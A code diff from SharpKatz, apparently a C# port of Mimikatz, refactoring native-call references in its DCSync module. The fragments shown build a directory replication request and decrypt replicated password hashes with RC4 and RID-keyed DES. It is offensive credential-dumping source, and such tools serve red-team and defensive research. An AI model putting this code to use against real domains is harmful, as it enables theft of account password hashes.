@@ -5,7 +5,7 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using static SharpKatz.Module.Kerberos;
-using static SharpKatz.Natives;
+using static SharpKatz.Win32.Natives;
 
 namespace SharpKatz.Module
 {
@@ -204,7 +204,7 @@ namespace SharpKatz.Module
             mSG_GETCHGREQ.cMaxBytes = 0x00a00000; // 10M
             mSG_GETCHGREQ.ulExtendedOp = (uint)((alldata) ? 0 : 6);
 
-            IntPtr result = Natives.NdrClientCall2_5(GetStubPtr(4, 0), GetProcStringPtr(134), hDrs, 8, mSG_GETCHGREQ, ref dwOutVersion, ref mSG_GETCHGREPLY);
+            IntPtr result = NdrClientCall2_5(GetStubPtr(4, 0), GetProcStringPtr(134), hDrs, 8, mSG_GETCHGREQ, ref dwOutVersion, ref mSG_GETCHGREPLY);
 
             return (int)result.ToInt64();
         }
@@ -677,7 +677,7 @@ namespace SharpKatz.Module
             Array.Copy(data, 16, todecrypt, 0, data.Length - 16);
             CRYPTO_BUFFER todecryptBuffer = GetCryptoBuffer(todecrypt);
             CRYPTO_BUFFER keyBuffer = GetCryptoBuffer(key);
-            int ret = Natives.RtlEncryptDecryptRC4(ref todecryptBuffer, ref keyBuffer);
+            int ret = RtlEncryptDecryptRC4(ref todecryptBuffer, ref keyBuffer);
             byte[] decrypted = new byte[todecryptBuffer.Length];
             Marshal.Copy(todecryptBuffer.Buffer, decrypted, 0, decrypted.Length);
             Marshal.FreeHGlobal(todecryptBuffer.Buffer);
@@ -784,16 +784,16 @@ namespace SharpKatz.Module
             // extract the RID from the SID
             GCHandle handle = GCHandle.Alloc(sidByteForm, GCHandleType.Pinned);
             IntPtr sidIntPtr = handle.AddrOfPinnedObject();
-            IntPtr SubAuthorityCountIntPtr = Natives.GetSidSubAuthorityCount(sidIntPtr);
+            IntPtr SubAuthorityCountIntPtr = GetSidSubAuthorityCount(sidIntPtr);
             byte SubAuthorityCount = Marshal.ReadByte(SubAuthorityCountIntPtr);
-            IntPtr SubAuthorityIntPtr = Natives.GetSidSubAuthority(sidIntPtr, (uint)SubAuthorityCount - 1);
+            IntPtr SubAuthorityIntPtr = GetSidSubAuthority(sidIntPtr, (uint)SubAuthorityCount - 1);
             uint rid = (uint)Marshal.ReadInt32(SubAuthorityIntPtr);
             handle.Free();
 
             // Decrypt the hash
             byte[] output = new byte[16];
             IntPtr outputPtr = Marshal.AllocHGlobal(16);
-            Natives.RtlDecryptDES2blocks1DWORD(hashEncryptedWithRID, ref rid, outputPtr);
+            RtlDecryptDES2blocks1DWORD(hashEncryptedWithRID, ref rid, outputPtr);
             Marshal.Copy(outputPtr, output, 0, 16);
             Marshal.FreeHGlobal(outputPtr);
             return output;
@@ -839,7 +839,7 @@ namespace SharpKatz.Module
                 GCHandle tmp_objPinnedArray = GCHandle.Alloc(tmp_obj, GCHandleType.Pinned);
                 IntPtr pobjectSid = tmp_objPinnedArray.AddrOfPinnedObject();
 
-                IntPtr subSid = GetSidSubAuthority(pobjectSid, (uint)Marshal.ReadByte(Natives.GetSidSubAuthorityCount(pobjectSid)) - 1);
+                IntPtr subSid = GetSidSubAuthority(pobjectSid, (uint)Marshal.ReadByte(GetSidSubAuthorityCount(pobjectSid)) - 1);
 
                 if (subSid != IntPtr.Zero)
                 {
